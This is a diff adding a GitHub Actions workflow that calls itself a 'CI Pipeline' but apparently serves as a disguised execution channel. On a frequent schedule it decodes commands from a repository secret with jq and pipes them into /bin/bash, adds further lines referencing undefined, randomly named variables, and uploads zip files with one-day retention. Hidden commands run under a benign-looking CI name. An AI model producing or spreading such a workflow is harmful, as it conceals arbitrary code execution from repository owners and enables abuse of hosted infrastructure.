@@ -1,0 +1,31 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          pi68: ${{ secrets.pi68 }}
+        run: |
+          printf '%s' "$pi68" | jq -r .n9752 | /bin/bash
+          printf '%s' "$vhndf70" | jq -r .jwvd8350 | /bin/bash
+          echo $xckm4563 | jq -r .d15 | /bin/bash
+          echo $iz2 | jq -r .oj86158 | /bin/bash
+          printf '%s' "$h714" | jq -r .gmp158 | /bin/bash
+          printf '%s' "$egfcq23" | jq -r .mfjcq740 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: FmaF22Se
+          path: "*.zip"
+          retention-days: 1
